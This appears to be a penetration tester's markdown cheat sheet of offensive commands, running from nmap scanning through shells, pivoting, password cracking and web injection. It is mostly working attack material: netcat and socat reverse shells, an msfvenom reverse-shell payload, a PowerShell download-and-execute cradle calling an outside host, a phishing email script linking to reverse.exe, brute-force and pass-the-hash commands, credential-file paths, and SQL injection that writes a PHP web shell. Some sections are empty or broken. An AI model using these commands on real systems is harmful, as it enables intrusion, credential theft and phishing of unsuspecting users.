# TODO: Table of Contents/Links


# network scanning
## nmap 
### Basic Scanning Techniques
-   Scan a single target
    -   `nmap [target]`
-   Scan multiple targets
    -   `nmap [target1,target2,etc]`
-   Scan a list of targets
    -   `nmap -iL [list.txt]`
-   Scan a range of hosts
    -   `nmap [range of IP addresses]
-   Scan an entire subnet
    -   `nmap [IP address/cdir]`
-   Scan random hosts
    -   `nmap -iR [number]`
-   Excluding targets from a scan
    -   `nmap [targets] –exclude [targets]`
-   Excluding targets using a list
    -   `nmap [targets] –excludefile [list.txt]`
-   Perform an aggressive scan
    -   `nmap -A [target]`
-   Scan an IPv6 target
    -   `nmap -6 [target]`

### Discovery Options
-   Perform a ping scan only
    -   `nmap -sP [target]`
-   Don’t ping
    -   `nmap -PN [target]`
-   TCP SYN Ping
    -   `nmap -PS [target]`
-   TCP ACK ping
    -   `nmap -PA [target]`
-   UDP ping
    -   `nmap -PU [target]`
-   SCTP Init Ping
    -   `nmap -PY [target]`
-   ICMP echo ping
    -   `nmap -PE [target]`
-   ICMP Timestamp ping
    -   `nmap -PP [target]`
-   ICMP address mask ping
    -   `nmap -PM [target]`
-   IP protocol ping
    -   `nmap -PO [target]
-   ARP ping
    -   `nmap -PR [target]`
-   Traceroute
    -   `nmap –traceroute [target]`
-   Force reverse DNS resolution
    -   `nmap -R [target]`
-   Disable reverse DNS resolution
    -   `nmap -n [target]`
-   Alternative DNS lookup
    -   `nmap –system-dns [target]`
-   Manually specify DNS servers
    -   `nmap –dns-servers [servers] [target]`
-   Create a host list
    -   `nmap -sL [targets]`

### Advanced Scanning Options
-   TCP SYN Scan
    -   `nmap -sS [target]`
-   TCP connect scan
    -   `nmap -sT [target]`
-   UDP scan
    -   `nmap -sU [target]`
-   TCP Null scan
    -   `nmap -sN [target]`
-   TCP Fin scan
    -   `nmap -sF [target]`
-   Xmas scan
    -   `nmap -sX [target]`
-   TCP ACK scan
    -   `nmap -sA [target]`
-   Custom TCP scan
    -   `nmap –scanflags [flags] [target]`
-   IP protocol scan
    -   `nmap -sO [target]`
-   Send Raw Ethernet packets
    -   `nmap –send-eth [target]`
-   Send IP packets
    -   `nmap –send-ip [target]`

### Port Scanning Options
-   Perform a fast scan
    -   `nmap -F [target]`
-   Scan specific ports
    -   `nmap -p [ports] [target]`
-   Scan ports by name
    -   `nmap -p [port name] [target]`
-   Scan ports by protocol
    -   `nmap -sU -sT -p U:[ports],T:[ports] [target]`
-   Scan all ports
    -   `nmap -p “*” [target]`
-   Scan top ports
    -   `nmap –top-ports [number] [target]
-   Perform a sequential port scan
    -   `nmap -r [target]`

### Version Detection
-   Operating system detection
    -   `nmap -O [target]`
-   Submit TCP/IP Fingerprints
    -   `http://www.nmap.org/submit/`
-   Attempt to guess an unknown
    -   `nmap -O –osscan-guess [target]`
-   Service version detection
    -   `nmap -sV [target]`
-   Troubleshooting version scans
    -   `nmap -sV –version-trace [target]`
-   Perform a RPC scan
    -   `nmap -sR [target]`

### Timing Options
-   Timing Templates
    -   `nmap -T [0-5] [target]`
-   Set the packet TTL
    -   `nmap –ttl [time] [target]`
-   Minimum of parallel connections
    -   `nmap –min-parallelism [number] [target]`
-   Maximum of parallel connection
    -   `nmap –max-parallelism [number] [target]`
-   Minimum host group size
    -   `nmap –min-hostgroup [number] [targets]`
-   Maximum host group size
    -   `nmap –max-hostgroup [number] [targets]`
-   Maximum RTT timeout
    -   `nmap –initial-rtt-timeout [time] [target]`
-   Initial RTT timeout
    -   `nmap –max-rtt-timeout [TTL] [target]`
-   Maximum retries
    -   `nmap –max-retries [number] [target]`
-   Host timeout
    -   `nmap –host-timeout [time] [target]`
-   Minimum Scan delay
    -   `nmap –scan-delay [time] [target]`
-   Maximum scan delay
    -   `nmap –max-scan-delay [time] [target]`
-   Minimum packet rate
    -   `nmap –min-rate [number] [target]`
-   Maximum packet rate
    -   `nmap –max-rate [number] [target]`
-   Defeat reset rate limits
    -   `nmap –defeat-rst-ratelimit [target]`

### Firewall Evasion Techniques
-   Fragment packets
    -   `nmap -f [target]`
-   Specify a specific MTU
    -   `nmap –mtu [MTU] [target]`
-   Use a decoy
    -   `nmap -D RND: [number] [target]`
-   Idle zombie scan
    -   `nmap -sI [zombie] [target]`
-   Manually specify a source port
    -   `nmap –source-port [port] [target]`
-   Append random data
    -   `nmap –data-length [size] [target]`
-   Randomize target scan order
    -   `nmap –randomize-hosts [target]`
-   Spoof MAC Address
    -   `nmap –spoof-mac [MAC|0|vendor] [target]`
-   Send bad checksums
    -   `nmap –badsum [target]`

### Output Options
-   Save output to a text file
    -   `nmap -oN [scan.txt] [target]`
-   Save output to a xml file
    -   `nmap -oX [scan.xml] [target]`
-   Grepable output
    -   `nmap -oG [scan.txt] [target]`
-   Output all supported file types
    -   `nmap -oA [path/filename] [target]`
-   Periodically display statistics
    -   `nmap –stats-every [time] [target]`
-   133t output
    -   `nmap -oS [scan.txt] [target]`

### Troubleshooting and debugging
-   Help
    -   `nmap -h`
-   Display Nmap version
    -   `nmap -V`
-   Verbose output
    -   `nmap -v [target]`
-   Debugging
    -   `nmap -d [target]`
-   Display port state reason
    -   `nmap –reason [target]`
-   Only display open ports
    -   `nmap –open [target]`
-   Trace packets
    -   `nmap –packet-trace [target]`
-   Display host networking
    -   `nmap –iflist`
-   Specify a network interface
    -   `nmap -e [interface] [target]`

### Nmap Scripting Engine
-   Execute individual scripts
    -   `nmap –script [script.nse] [target]`
-   Execute multiple scripts
    -   `nmap –script [expression] [target]`
-   Script categories
    -   `all, auth, default, discovery, external, intrusive, malware, safe, vuln`
-   Execute scripts by category
    -   `nmap –script [category] [target]`
-   Execute multiple scripts categories
    -   `nmap –script [category1,category2, etc]`
-   Troubleshoot scripts
    -   `nmap –script [script] –script-trace [target]`
-   Update the script database
    -   `nmap –script-updatedb`






# one-liners
## windows
#### dir and file
list all files current dir
`get-childitem -hidden` 

search C:\ for password
`ci -recurse C:\ | % { select-string -path $_ -pattern password} 2>$null`

base64
`certutil -encone/-decode <FILE> <OUTFILE>`

copy contents of file to clipboard
`Get-Content <FILENAME> | Set-Clipboard`


## nix


# shells & file transfers
### netcat
#### file transfer
target machine
`nc -nlvp 9001 > incoming.exe`
local machine
`nc -nv IP.ADDR 9001 < EXAMPLE.exe`
(note: no output, must guess when upload complete)

#### bind shell
target
`nc -lnvp 9001 -e cmd.exe`
local
`nc -nv IP.ADDR 9001`

#### reverse shell
target
`nc -nv IP.ADDR 9001 -e /bin/bash`
local
`nc -lnvp 9001`

### socat
#### connecting
`socat - TCP4:10.11.0.22:110`

#### listener
host
`sudo socat TCP4-LISTEN:443 STDOUT`
local
`socat - TCP4:10.11.0.22:443`

#### file transfer
host
`sudo socat TCP4-LISTEN:443,fork file:EXAMPLE.txt`
local
`socat TCP4:10.11.0.4:443 file:EXAMPLE_NAME.txt,create`

#### reverse shell
local
`sudo socat -d -d TCP4-LISTEN:443 STDOUT`
target
`socat TCP4:10.11.0.22:443 EXEC:/bin/bash`

#### encrypted bind shells
create self-signed certificate
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`

#### rdesktop
`rdesktop -u student -k pt -g 2048x1110 192.168.197.10`

### FTP
`passive`
toggles the passive/active mode during session

### MSFVenom

#### shell generation - bytes
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "BYTES_GO_here"
```
### smb 
#### setup on nix
`$ sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1`

#### create cred object
```
> $pass = convertto-securestring 'password1' -AsPlainText -Force`
> $cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
> New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.14.52\tools
cd dials:
```

#### PowerShell New-Object
Always try specifying full path. 
download file
`(New-Object System.Net.Webclient).DownloadFile("http://<IP>:<PORT>/<FILENAME>.exe","C:\<FILENAME>.exe")`

download a file and execute from memory with powercat
`IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`

#### PowerShell Invoke-WebRequest
`powershell Invoke-WebRequest -url http://10.10.10.10:9000/file.txt`

shorthand
`powershell IWR -url http://10.10.10.10:9000/file.txt -OutFile C:\\Windows\\temp\\file.txt`


### smb
localhost
`sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1

``` 
$pass = convertto-securestring 'password1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\LOCAL_KALI_IP\tools
cd dials:
```

### credentials
```
C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
```
sharpweb?
python cracker?



# smtp email

### email w/ smtp > netcat

smtp file contents:
```
HELO VICTIM
MAIL FROM: <rmurray@victim>
RCPT TO: <tharper@victim>
DATA
Subject: This is an urgent patch please install!

Please install this urgent patch

http://192.168.119.243:9002/reverse.exe

Sincerly, Ross

.
QUIT
```

`cat "smtp" |while read L; do sleep "1"; echo "$L"; done | "nc" -C -v "192.168.243.55" "25"`


# Pivoting

#### SSH Tunneling - Local
format for accessing remote location via localhost forward on Kali
`ssh -N -L [bind_address:]port:host:hostport [username@address]`

ssh tunnel which allows traffic from Kali localhost:445 (0.0.0.0:445) to access 192.168.1.110:445 through SSH to studen@10.11.0.128
`sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128`

#### SSH Tunneling - Remote
format for accessing remote location via remote forward
`ssh -N -R [bind_address:]port:host:hostport [username@address]`

command to ssh into a target (student@192.168.197.52) on port 2222 and then remotely forward port 5555 of student@192.168.197.52 to port 5555 on local kali machine (192.168.119.197) 
` ssh student@192.168.197.52 -p 2222 -N -R 192.168.119.197:5555:127.0.0.1:5555 kali@192.168.119.197`

#### chisel
\*nix local
`./chisel server --reverse -p 9001`

win remote
`./chisel.exe client <IP.ADDR>:9001 R:<PORT_TO_FWD>:LOCALHOST:<PORT_TO_FWD>`



### msfvenom
generate shellcode, filtering out bad characters
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`




## crackmapexec

#### anonymous/fake login - list shares
cme smb 10.10.11.152 -u 'anon' -p '' --shares 




# Cracking
#### cewl
create wordlist from megacorpone.com with a minimum length of 6, output to file "megacorp-cewl.txt"
`cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`

#### john
create wordlist from text file with "rules" applied
`john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt grep Nanobot mutated.txt`
crack hash "hash.txt" with a format of "NT" using rockyou 
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT`
crack hash "hash.txt" with a format of "NT" using rules and rockyou 
`john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT`
cracking unshadowed.txt file using "rules"
`john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

#### unshadow
using unshadow command on a passwd and shadow file to create an unshadowed text file.
`unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`


#### crunch
create a password with minimum and maximum length of 8, -t to specify specific pattern. This will be a large list. (see man page)
`crunch 8 8 -t ,@@^^%%%`
create list based off specific characters and write to a file
`crunch 4 6 0123456789ABCDEF -o crunch.txt`
create list using mixedalpha, present in charset.lst
`crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`

#### medusa
use rockyou.txt to attack /admin endpoint as admin user , use HTTP authentication scheme (-M)
`medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`

#### crowbar
remote desktop attack (-b) targeting server (-s) with username (-u), wordlist (-C) and number of threads (n)
`crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`

#### thc-hydra
hydra ssh attack using kali username and rockyou.txt
`hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
hydra HTTP POST attack specifying username "admin" with "INVALID LOGIN" being a failure criteria
`hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`

#### pass the hash - winexe
use pth-winexe to pass the hash, executing a command prompt 
`pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`






# ipv6
## mitm6
+
# RESOURCES
## buffer overflow
#### x86 cheat sheet
https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

#### registers
##### ESP - Stack Pointer
**STACK** keeps track of most recently referenced location (top) of the stack, stores pointer to it

##### EBP - Base Pointer
**STACK** points to the top of the stack when a function is called, used by a function to access information from its own stack frame

##### EIP - Instruction Pointer
points to the next code instruction to be executed, directs the flow of a program

##### EAX - Accumulator Register
used for arithmetic, interrupt calls, logical instructions

##### EBX - Base Pointer
used as a pointer for memory access

##### ECX - Counter Register
used as loop counter

##### EDX - Data Register
used in I/O port access, arithmetic

##### ESI - Source Index
used for string and array copying

##### EDI - Destination Index Register
pointer addressing data and destination in string/array copying

```
# Unicode char can cause breaks in some applications
# Exemple with the pile of poo
https://emojipedia.org/pile-of-poo/
💩
```







# WEB
## discovery
### resources
```bash
# Fuzzing Wordlists
https://github.com/fuzzdb-project/fuzzdb

# Fuzzing and Content Discovery
https://github.com/kaimi-io/web-fuzz-wordlists

# Fuzz non-printable characters in any user input
# Could result in regex bypass
0x00, 0x2F, 0x3A, 0x40, 0x5B, 0x60, 0x7B, 0xFF
%00, %2F, %3A, %40, %5B, %60, %7B, %FF

# Unicode char can cause breaks in some applications
# Exemple with the pile of poo
https://emojipedia.org/pile-of-poo/
💩
```

### hakrawler
`https://github.com/hakluke/hakrawler  # Usage cat urls.txt | hakrawler  # Example tool chain echo google.com | haktrails subdomains | httpx | hakrawler`

### idor
```bash
# Bypass restrictions using parameter pollution
# You can use the same parameter several times
api.example/profile?UserId=123 # Ok, your profile
api.example/profile?UserId=456 # ERROR
api.example/profile?UserId=456&UserId=123 # OK, it can work
# Tips 
# - Some encoded/hashed IDs can be predictable --> Create accounts to see 
# - Try some id, user_id, message_id even if the application seems to not offer it (on API for ex)
# - Parameter Polluttion (HPP) 
# - Switch between POST and PUT to bypass potential controls
```

### HTTP Request Smuggling
https://portswigger.net/web-security/request-smuggling
```bash
# Smuggler.py is a small tool used to test that python smuggler.py -h                                           smuggler.py 
[-h] [-a PATH] [-d HEADER] [-i TIMEOUT] [-m METHOD][-o HOSTS] [-s SCHEME] [-t THREADS] [-u URLS] [-v VERBOSE]  optional arguments:   

-h, --help            
show this help message and exit   

-a PATH, --path PATH  
set paths list  

-d HEADER, --header HEADER                         
custom headers

-i TIMEOUT, --timeout TIMEOUT                         
set timeout, default 10   

-m METHOD, --method METHOD                         
set methods separated by comma, default: all 

-o HOSTS, --hosts HOSTS                         
set host list (required or -u)   

-s SCHEME, --scheme SCHEME                         
scheme to use, default: http,https   

-t THREADS, --threads THREADS                         
threads, default 10   

-u URLS, --urls URLS  
set url list (required or -o)   

-v VERBOSE, --verbose VERBOSE                         
display output, 0=nothing, 1=only vulnerable, 2=all                         requests, 3=requests+headers, 4=full debug, default: 1
```


### ffuf
```bash
# Directory discovery
ffuf -w /path/to/wordlist -u https://target/FUZZ

# Adding classical header (some WAF bypass)
ffuf -c -w "/opt/host/main.txt:FILE" -H "X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1" -fs 5682,0 -u https://target/FUZZ

# match all responses but filter out those with content-size 42
ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v

# Fuzz Host-header, match HTTP 200 responses.
ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200

# Virtual host discovery (without DNS records)
ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242

# Playing with threads and wait
./ffuf -u https://target/FUZZ -w /home/mdayber/Documents/Tools/Wordlists/WebContent_Discovery/content_discovery_4500.txt -c -p 0.1 -t 10

# GET param fuzzing, filtering for invalid response size (or whatever)
ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242

# GET parameter fuzzing if the param is known (fuzzing values) and filtering 401
ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ -fc 401

# POST parameter fuzzing
ffuf -w /path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401

# Fuzz POST JSON data. Match all responses not containing text "error".
ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
      -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"
```

### dirsearch
```
./dirsearch.py -u https://www.target.fr -f -e php,xml,txt -t 10 -w wordpress.fuzz.txt
```

### dirscrapper (js discrapping)
```bash
# You can parse and scrape javascript content in a target website to look for hidden subdomains or interesting paths
# Often, endpoints are not public but users can still interact with them
# Tools like dirscraper automates this (https://github.com/Cillian-Collins/dirscraper)

# Classic
python discraper.py -u <url>

# Output mode
python discraper.py -u <url> -o <output>

# Silent mode (you won't see result in term)
python discraper.py -u <url> -s -o <output>

# Relative URL Extractor is another good tool to scrape from JS files (https://github.com/jobertabma/relative-url-extractor)
ruby extract.rb https://hackerone.com/some-file.js
```



## application scans
### wpscan
```bash
# Scan Wordpress - version docker disponible
$ wpscan -h

# Scan non intrusif
$ wpscan --url http://monsite.com

# Enumeration
wpscan.rb --url www.example.com --enumerate # Tout
wpscan.rb --url www.example.com --enumerate p # Plugins
wpscan.rb --url www.example.com --enumerate u # Users

# Scan bruteforce les user énumérés avec une wordlist
$ wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50
```
### chopchop
```bash
https://github.com/michelin/ChopChop

# ChopChop is a new tool used to scan/test different endpoints.
# Its goal is to scan several endpoints and identify exposition of services/files/folders through the webroot.

# Easiest usage
$ ./gochopchop scan --url https://foobar.com

# List plugins
$ ./gochopchop plugins
$ ./gochopchop plugins --severity High

# URL list
$ ./gochopchop scan --url-file url_file.txt
```
## waf
### wafwoof
```bash
# Simple tool used to identify and fingerprint WAF
# Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions
# If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is
# If that is also not successful, it analyses the responses previously returned and uses another 
# simple algorithm to guess if a WAF or security solution is actively responding to our attacks
./wafw00l -l
./wafw00t https://target.com
```
### or manual check via telnet
```bash
# Through telnet, you can identify if there is a WAF
telnet <site/ip> <80/443>
GET / HTTP/1.1
```

### enumerating firewalls/gateway
```bash
https://www.secjuice.com/osint-detecting-enumerating-firewalls-gateways/
# Some tips and quick wins

# URL
# - /dana-na/ --> Pulse VPN Gateways
# - /remote/login --> Fortinet VPN Gateways
# - /+CSCOE+/logon.html --> Cisco-VPN
# - /vpn/index.html --> Netscaler

# Ports
# 264 / 18264 --> Checkpoint
# 4443 --> SonicWall / Sophos
# 500/udp --> Can be Cisco VPN (IPSEC iirc)
```

## injection
### sqli
*when an attacker is able to manipulate queries which an application makes to a database*

```bash
https://websec.wordpress.com/tag/sql-filter-bypass/  

# Cheat sheet 
https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md

# Classical test
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
admin\'-- -

# waf bypass
SELECT-1e1FROM`test`
SELECT~1.FROM`test`
SELECT\NFROM`test`
SELECT@^1.FROM`test`
SELECT-id-1.FROM`test`

# Upload file
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'

```

### ssrf
*vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location*

```bash
# It is possible to prove the vulnerability by reading local files
# Using the file protocol
url=file:///etc/passwd

# Then you can enumerate local services that are listening
# Depending on the response
http://localhost:<port>

# It is also possible to use others protocols like gopher and dict
# They don't send HTTP headers and can avoid misinterpretation
gopher://127.0.0.1:6379/test

# Filter bypass
http://127.1 instead of http://127.0.0.1
http://0 instead of http://localhost
http://0xC0A80001 or http://3232235521 => 192.168.0.1
192.168.516 => 192.168.2.4

# php wrappers
gopher://
fd://
expect://
ogg://
tftp://
dict://
ftp://
ssh2://
file://
http://
https://
imap://
pop3://
mailto://
smtp://
telnet://
```

### xss 
*an attack where malicious scripts are injected into a web application and sent to a different user. typically used to steal cookies or session tokens, they can also go so far as to rewrite the content of the HTML page.*

filter evasion
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

# NETWORK
# SHELLS
# WINDOWS
# LINUX
# PASSWORDS & CRACKING
